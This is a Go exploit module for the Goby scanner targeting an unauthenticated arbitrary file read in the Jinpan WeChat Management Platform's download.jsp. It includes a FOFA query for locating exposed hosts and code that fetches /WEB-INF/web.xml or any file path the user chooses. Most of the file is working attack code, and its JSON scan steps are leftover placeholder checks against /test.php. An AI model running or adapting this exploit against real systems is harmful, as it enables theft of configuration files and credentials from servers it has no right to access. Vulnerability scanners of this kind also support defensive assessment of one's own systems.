package exploits

import (
  "strings"

  "git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
  expJson := `{
    "Name": "Jinpan WeChat Management Platform /mobile/pages/admin/tools/file/download.jsp File Read Vulnerability",
    "Description": "<p>Beijing Jinpan Pengtu Software Technology Co., Ltd. is a high-tech enterprise specializing in the research, development, promotion, application, and system maintenance of library information automation products. The company's main business is to provide commercialized information systems, information system design, information system product development, software system integration, and services to various departments such as university libraries, government agencies, military academies, scientific research institutions, and large and medium-sized enterprise intelligence and information service institutions across the country.</p><p>Golden Disk WeChat Management Platform download.jsp arbitrary file reading vulnerability, which can be used to read database configuration files, etc</p>",
    "Product": "Jinpan WeChat Management Platform",
    "Homepage": "http://www.goldlib.com.cn/",
    "DisclosureDate": "2024-11-19",
    "PostTime": "2024-11-19",
    "Author": "1638690747@qq.com",
    "FofaQuery": "body=\"weichatcfgcontroller.js\" && body=\"AppCtrl\" || title=\"微信管理后台\"",
    "GobyQuery": "body=\"weichatcfgcontroller.js\" && body=\"AppCtrl\" || title=\"微信管理后台\"",
    "Level": "2",
    "Impact": "<p>Unauthenticated attackers can exploit this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, and so on, causing the website to be in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Unless necessary, public access to the system is prohibited.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E9%87%91%E7%9B%98/%E9%87%91%E7%9B%98%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0download.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "web.xml,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/WEB-INF/web.xml",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "金盘微信管理平台 /mobile/pages/admin/tools/file/download.jsp 文件读取漏洞",
            "Product": "金盘微信管理平台",
            "Description": "<p>北京金盘鹏图软件技术有限公司是专门从事图书馆信息自动化产品的研制开发、推广应用和系统维护的高新技术企业。公司主要业务是面向全国各高校图书馆、政府机关、军队院校、科研机关、大中型企业情报和信息服务机构等部门提供商品化的信息系统、信息系统设计、信息系统产品开发、软件系统集成和服务。<br></p><p>金盘微信管理平台download.jsp任意文件读取漏洞，通过该漏洞读取数据库配置文件等<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Jinpan WeChat Management Platform /mobile/pages/admin/tools/file/download.jsp File Read Vulnerability",
            "Product": "Jinpan WeChat Management Platform",
            "Description": "<p>Beijing Jinpan Pengtu Software Technology Co., Ltd. is a high-tech enterprise specializing in the research, development, promotion, application, and system maintenance of library information automation products. The company's main business is to provide commercialized information systems, information system design, information system product development, software system integration, and services to various departments such as university libraries, government agencies, military academies, scientific research institutions, and large and medium-sized enterprise intelligence and information service institutions across the country.<br></p><p>Golden Disk WeChat Management Platform download.jsp arbitrary file reading vulnerability, which can be used to read database configuration files, etc<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Unless necessary, public access to the system is prohibited.</p>",
            "Impact": "<p>Unauthenticated attackers can exploit this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, and so on, causing the website to be in an extremely insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9973"
}`
  
  postOrGet_Ag8uo3CT := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
    respTxt := ""
    URLPath := "/mobile/pages/admin/tools/file/download.jsp?items="
    getRequestConfig := httpclient.NewGetRequestConfig(URLPath + filePath)
    getRequestConfig.VerifyTls = false
    getRequestConfig.FollowRedirect = false
    //请求
    response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)

    if err != nil || response == nil {
      return "", err
    }
    respTxt = response.RawBody
    // 注意：返回值为（最终要返回的读取结果，错误）
    return respTxt, nil
  }

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      // 此处需要修改：设置成功后的vulurl
      vulURL := "/mobile/pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml"
      // 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
      defaultModeMap := map[string]string{
        "/WEB-INF/web.xml": "webAppRootKey",
      }
      // 函数继承
      fileReadFunc := postOrGet_Ag8uo3CT

      // 请注意：后续代码为模板代码，非特殊情况，无需更改
      // ----------------------------------------------------------------------------------------------------------------------------------------------------
      for filePath, fileText := range defaultModeMap {
        resp, err := fileReadFunc(u, filePath)
        if err != nil {
          continue
        }
        if strings.Contains(resp, fileText) {
          // 设置VULURL
          ss.VulURL = u.HostInfo + vulURL
          return true
        }
      }
      return false
    },

    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      var fileUrl string
      var fileText string
      mode := goutils.B2S(ss.Params["Mode"])
      // 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
      defaultModeMap := map[string][2]string{
        "web.xml": {"/WEB-INF/web.xml", "webAppRootKey"},
      }
      // 此处需要修改：函数继承
      fileReadFunc := postOrGet_Ag8uo3CT

      // 请注意，后续代码为模板固化，正常情况下均无需修改
      // ----------------------------------------------------------------------------------------------------------------------------------------------------
      if mode == "Customize" {
        fileUrl = goutils.B2S(ss.Params["Customize"])
      } else {
        if _, ok := defaultModeMap[mode]; ok {
          fileUrl = defaultModeMap[mode][0]
          fileText = defaultModeMap[mode][1]
        } else {
          expResult.Success = false
          return expResult
        }
      }

      // 获取返回结果url和返回请求头
      resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
      if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
        expResult.Success = false
        return expResult
      }

      expResult.Success = true
      expResult.Output = resp
      return expResult
    },
  ))
}